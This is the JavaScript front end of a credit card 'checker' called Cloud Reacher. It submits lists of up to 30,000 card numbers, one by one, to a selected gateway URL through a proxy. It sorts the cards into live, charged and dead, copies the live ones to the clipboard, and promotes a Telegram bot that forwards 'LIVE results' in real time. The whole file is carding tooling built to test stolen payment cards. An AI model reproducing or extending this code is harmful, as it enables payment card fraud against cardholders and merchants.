console.log("✅ Cloud Reacher has been activated!");

function toggleSpeedOptions() {
    const options = document.getElementById("speedOptions");
    if (options) {
        options.style.display = options.style.display === "none" ? "block" : "none";
    }
}

function saveSpeed() {
    const selected = $('#speedSelector').val();
    let label = "Normal";
    if (selected === "100") label = "Fast";
    else if (selected === "5000") label = "Normal";
    else if (selected === "10000") label = "Slow";

    // Save to localStorage
    localStorage.setItem('preferredSpeed', selected);

    // Update label in UI
    $('#currentSpeed').text(label);

    // Hide the options popup
    $('#speedOptions').hide();

    // Optional success alert
    Swal.fire({
        title: "Speed updated to " + label + "!",
        icon: "success",
        toast: true,
        showConfirmButton: false,
        timer: 2000,
        position: "top-end"
    });
}

function toggleLive() {
    const target = document.getElementById('cards_aprovadas');
    const toggleButton = document.querySelector('.show-lives');

    if (target.style.display === 'none' || target.style.display === '') {
        target.style.display = 'block';
        toggleButton.textContent = '[Hide]';
    } else {
        target.style.display = 'none';
        toggleButton.textContent = '[Show]';
    }
}

function copyLive() {
    const text = document.getElementById('cards_aprovadas').innerText;
    if (!text.trim()) {
        Swal.fire({
            title: 'No Live cards to copy!',
            icon: 'warning',
            toast: true,
            showConfirmButton: false,
            position: 'top-end',
            timer: 2000
        });
        return;
    }

    const textarea = document.createElement('textarea');
    textarea.value = text;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);

    Swal.fire({
        title: 'LIVE cards copied!',
        icon: 'success',
        toast: true,
        showConfirmButton: false,
        position: 'top-end',
        timer: 2000
    });
}

function toggleDead() {
    const target = document.getElementById('cards_reprovadas');
    const toggleButton = document.querySelector('.show-dies');

    if (target.style.display === 'none' || target.style.display === '') {
        target.style.display = 'block';
        toggleButton.textContent = '[Hide]';
    } else {
        target.style.display = 'none';
        toggleButton.textContent = '[Show]';
    }
}

function clearDead() {
    Swal.fire({
        title: 'REMOVE CC DEAD SUCCESS',
        icon: 'success',
        toast: true,
        showConfirmButton: false,
        position: 'top-end',
        timer: 3000
    });
    document.getElementById('cards_reprovadas').innerText = '';
}


$(document).ready(function () {
    // ✅ SweetAlert welcome message
    Swal.fire({ 
        title: "Welcome!", 
        html: "<strong>How to use:</strong><br><br> \
            💳 This card checker has a built-in Telegram forwarder. It saves all your <strong>LIVE results</strong> automatically!<br><br> \
            👉 <strong>How to use the forwarder:</strong><br> \
            1️⃣ Open <strong>Telegram</strong> app.<br> \
            2️⃣ Search for <code>@sakurareceiptbot</code>.<br> \
            3️⃣ Click <strong>Start</strong> to activate it.<br> \
            4️⃣ You’ll now get <strong>real-time updates</strong> when checking cards!<br><br> \
            📌 That’s it — quick and easy!",
        imageUrl: "theme-assets/img/shadow.png",
        imageWidth: 100,
        confirmButtonText: "OK",
        buttonsStyling: false,
        customClass: {
            confirmButton: 'btn btn-primary'
        }
    });

    // ✅ Toggle output boxes
    /*$('.show-charge, .show-lives, .show-dies').click(function () {
        const target = $(this).attr('data-target');
        const type = $(this).attr('type');
        $('#' + target).slideToggle();
        $(this).html(type === 'show' ? '<i class="fa fa-eye"></i>' : '<i class="fa fa-eye-slash"></i>')
               .attr('type', type === 'show' ? 'hidden' : 'show');
    });

    // ✅ Trash + copy
    $('.btn-trash').click(() => {
        Swal.fire({ title: 'REMOVE CC DEAD SUCCESS', icon: 'success', toast: true, position: 'top-end', timer: 3000 });
        $('#cards_reprovadas').text('');
    });

    $('.btn-copy1').click(() => copyToClipboard('cards_charge', 'COPY CC CHARGED SUCCESS'));
    $('.btn-copy').click(() => copyToClipboard('cards_aprovadas', 'COPY CC LIVE SUCCESS'));

    function copyToClipboard(id, message) {
        Swal.fire({ title: message, icon: 'success', toast: true, position: 'top-end', timer: 3000 });
        const text = document.getElementById(id).innerText;
        const textarea = document.createElement("textarea");
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
    }*/

    // ✅ Play button (card checking)
    $('.btn-play').click(function () {
        //const selectedSpeed = $('#speedSelector').val();
        var selectedSpeed = $('#speedSelector').val();
        const selectedGate = $("#gateSelector").val();
        const cards = $('.form-checker').val().trim();
        const array = cards.split('\n');
        const pklive = $("#pklive").val().trim();
        const cslive = $("#cslive").val().trim();

        let charge = 0, lives = 0, dies = 0, testadas = 0, txt = '';
        if (!cards) {
            Swal.fire({ title: 'Wheres your card?? please add a card!!', icon: 'error', toast: true, position: 'top-end', timer: 3000 });
            return;
        }
        console.log("✅ Checking started please wait for the result.");
        Swal.fire({ title: 'Please wait for the card to be processed !!', icon: 'success', toast: true, position: 'top-end', timer: 3000 });
        new Audio('theme-assets/audio/starts.mp3').play();

        const line = array.filter(function (value) {
            if (value.trim() !== "") {
                txt += value.trim() + '\n';
                return value.trim();
            }
        });

        const total = line.length;
        $('.form-checker').val(txt.trim());

        if (total > 30000) {
            Swal.fire({ title: ':) DARE TO CHECK MORE THAN 30000 CC Ah, Pretty SMALL!!', icon: 'warning', toast: true, position: 'top-end', timer: 3000 });
            return;
        }

        $('.carregadas').text(total);
        $('.btn-play').attr('disabled', true);
        $('.btn-stop').attr('disabled', false);

        line.every(function (data, index) {
            setTimeout(function () {
                $.ajax({
                    url: selectedGate + '?cards=' + data + '&chatid=' + cslive + '&proxy=' + pklive + '&referrer=Auth',
                    success: function (retorno) {
                        if (retorno.includes("Charge")) {
                            Swal.fire({ title: '+1 CHARGE CC', icon: 'success', toast: true, position: 'top-end', timer: 3000 });
                            new Audio('theme-assets/audio/live.mp3').play();
                            //$('#cards_charge').append(retorno);
                            $('#cards_aprovadas').append(retorno);
                            charge++;
                        } else if (retorno.includes("Live")) {
                            Swal.fire({ title: '+1 CARD AUTH NO CHARGE', icon: 'success', toast: true, position: 'top-end', timer: 3000 });
                            new Audio('theme-assets/audio/notif.mp3').play();
                            $('#cards_aprovadas').append(retorno);
                            lives++;
                        } else {
                            $('#cards_reprovadas').append(retorno);
                            dies++;
                        }

                        removelinha();
                        testadas = charge + lives + dies;
                        $('.charge').text(charge);
                        $('.aprovadas').text(lives);
                        $('.reprovadas').text(dies);
                        $('.testadas').text(testadas);

                        if (testadas === total) {
                            console.log("✅ Card checking completed. You can start another process.");
                            Swal.fire({ title: 'HAVE BEEN DISPOSED', icon: 'success', toast: true, position: 'top-end', timer: 3000 });
                            new Audio('theme-assets/audio/end.mp3').play();
                            $('.btn-play').attr('disabled', false);
                            $('.btn-stop').attr('disabled', true);
                        }
                    }
                });
            }, selectedSpeed * index);
            return true;
        });
    });

    function removelinha() {
        const lines = $('.form-checker').val().split('\n');
        lines.splice(0, 1);
        $('.form-checker').val(lines.join("\n"));
    }

    // ✅ Clock
    setInterval(() => {
        const now = new Date();
        $('#datetime').text(now.toLocaleDateString());
        $('#timenow').text(now.toLocaleTimeString());
    }, 1000);

    // ✅ Speed preference select dropdown
    $('#speedSelector').on('change', function () {
        const selected = $(this).val();
        const label = selected === "100" ? "Fast" : selected === "1000" ? "Normal" : "Slow";
        $('#currentSpeed').text(label);
        localStorage.setItem('preferredSpeed', selected);
    });

    const savedSpeed = localStorage.getItem('preferredSpeed');
    if (savedSpeed) {
        $('#speedSelector').val(savedSpeed).trigger('change');
    }
});
